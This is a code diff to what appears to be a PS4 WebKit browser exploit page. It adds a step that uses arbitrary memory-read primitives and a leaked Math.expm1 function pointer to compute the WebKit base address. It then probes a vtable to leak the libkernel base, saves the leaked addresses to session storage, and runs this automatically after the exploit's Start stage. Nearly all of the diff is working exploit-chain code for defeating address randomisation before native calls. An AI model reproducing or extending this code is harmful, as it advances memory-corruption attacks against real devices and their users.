@@ -2,14 +2,18 @@
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
-import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-3";
+import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-4";
 import { createCrashLog } from "./log_persist.js";
+import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
+import {
+    persistSessionBases, saveLibkernelSession, saveLastFnPtr,
+} from "./libkernel_resolve.js";
 import {
     fireStubSwapParseInt, fireCollatorStub, pinCollatorStub,
     STUB_LAST_STEP_KEY,
-} from "./stub_call.js?v=stub-5";
+} from "./stub_call.js?v=stub-6";
 
-const BUILD = "stub-page-5";
+const BUILD = "stub-page-6";
 const params = new URLSearchParams(location.search);
 let lines = [], ready = false, busy = false, collatorPin = null;
 const retain = [];
@@ -21,7 +25,7 @@ const crashLog = createCrashLog({
     buildId: BUILD,
     maxLines: 120,
     flushMs: 200,
-    critical: /^(FAIL|ERROR|STUB|PRIMITIVE|BOOT|SKIP|FIRE|TRIM|PIN)/,
+    critical: /^(FAIL|ERROR|STUB|PRIMITIVE|BOOT|SKIP|FIRE|TRIM|PIN|2E|LK-)/,
 });
 
 function $(id) { return document.getElementById(id); }
@@ -55,6 +59,121 @@ function parseAddr(raw) {
     if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
     if (s.length < 16) s = s.padStart(16, "0");
     return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
+}
+
+function read8p(p, addr) {
+    if (!addr) return null;
+    try { return p.read8(addr); } catch (_) { return null; }
+}
+
+function read4p(p, addr) {
+    if (!addr) return null;
+    try { return p.read4(addr); } catch (_) { return null; }
+}
+
+function chainWebkitBase(off) {
+    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
+    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
+    if (nativeFn && off.wk_expm1_builtin) {
+        const derived = nativeFn.sub32(off.wk_expm1_builtin);
+        if (derived) webkitBase = derived;
+    }
+    return webkitBase;
+}
+
+/** expm1 walk — same lightweight path as index_rw Start. */
+function persistWebkitBasesLight(p, off) {
+    if (!p || !off) return null;
+    const cell = p.leakval(Math.expm1);
+    const nativeFn = read8p(p, read8p(p, cell.add32(0x18))
+        .add32(off.wk_JSFunction_m_function || 0x28));
+    if (!nativeFn) return null;
+    const webkitBase = off.wk_expm1_builtin
+        ? nativeFn.sub32(off.wk_expm1_builtin)
+        : null;
+    persistSessionBases(nativeFn, webkitBase, { trust: "stub" });
+    return webkitBase;
+}
+
+function fillLkInput(lk, fnPtr) {
+    const hex = String(lk).replace(/^0x/i, "");
+    const inp = $("lk-in");
+    if (inp) inp.value = hex;
+    try { sessionStorage.setItem("wk-libkernelBase", hex); } catch (_) { }
+    if (fnPtr) saveLastFnPtr(fnPtr);
+}
+
+function onLkFoundHot(lk, hit) {
+    fillLkInput(lk, hit && hit.fnPtr);
+    saveLibkernelSession(lk, hit && hit.iatRva != null ? hit.iatRva : null, { forced: true });
+    const via = hit ? (hit.method + "/" + hit.via) : "?";
+    log("LK-OK", lk + " (" + via + ") — autofilled");
+    log("LK-HOT", "reads=0 — Arm or Fire");
+    state("lk hot — Arm / Fire", "ok");
+    flushLog();
+}
+
+async function run2e(fromStart) {
+    if (!ready || !window.p) return false;
+    if (!fromStart && busy) return false;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    let webkitBase = chainWebkitBase(off);
+    if (!webkitBase) {
+        try {
+            webkitBase = persistWebkitBasesLight(p, off);
+            if (webkitBase) log("WEBKIT-BASE", String(webkitBase));
+        } catch (e) {
+            log("WEBKIT-BASE-WARN", e.message || String(e));
+        }
+    }
+    if (!webkitBase) {
+        log("LK-SKIP", "no webkitBase — Start first");
+        state("Start first", "bad");
+        flushLog();
+        return false;
+    }
+
+    busy = true;
+    const btn2e = $("btn-2e");
+    if (btn2e) btn2e.disabled = true;
+    log("2E-LK", BUILD + " — vtable leak + lk vote");
+    flushLog();
+
+    try {
+        const vtslots = params.get("vtslots");
+        const result = await probeLibkernelViaVtable({
+            p: p,
+            carrier: window._wkCarrier || null,
+            webkitBase: webkitBase,
+            off: off,
+            log: log,
+            read8: read8p,
+            read4: read4p,
+            yieldFn: function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); },
+            opts: {
+                full: params.get("full") === "1",
+                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
+                retain: retain,
+            },
+        });
+        if (result.ok && result.lk) {
+            onLkFoundHot(result.lk, result.hit);
+            return true;
+        }
+        log("LK-HINT", "miss — ?g=drain:512 or ?full=1, then 2e again");
+        state("2e lk miss", "bad");
+        flushLog();
+        return false;
+    } catch (e) {
+        log("LK-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
+        state("2e error", "bad");
+        flushLog();
+        return false;
+    } finally {
+        busy = false;
+        if (btn2e && ready) btn2e.disabled = false;
+    }
 }
 
 function lkFromInput() {
@@ -150,8 +269,16 @@ async function runStart() {
         ready = true;
         $("btn-fire").disabled = false;
         $("btn-arm").disabled = false;
-        state("ready — Arm first, then Fire", "ok");
+        if ($("btn-2e")) $("btn-2e").disabled = false;
+        try {
+            const wb = persistWebkitBasesLight(window.p, loadEffectiveOff());
+            if (wb) log("WEBKIT-BASE", "saved " + wb);
+        } catch (_) { }
+        state("ready — 2e Leak+lk", "ok");
         flushLog();
+        if (params.get("noauto2e") !== "1") {
+            await run2e(true);
+        }
     } catch (e) {
         log("FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
         state("Start failed", "bad");
@@ -230,6 +357,7 @@ function init() {
         });
     });
     $("btn-start").onclick = runStart;
+    $("btn-2e").onclick = function () { run2e(); };
     $("btn-arm").onclick = runArm;
     $("btn-fire").onclick = runFire;
     const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
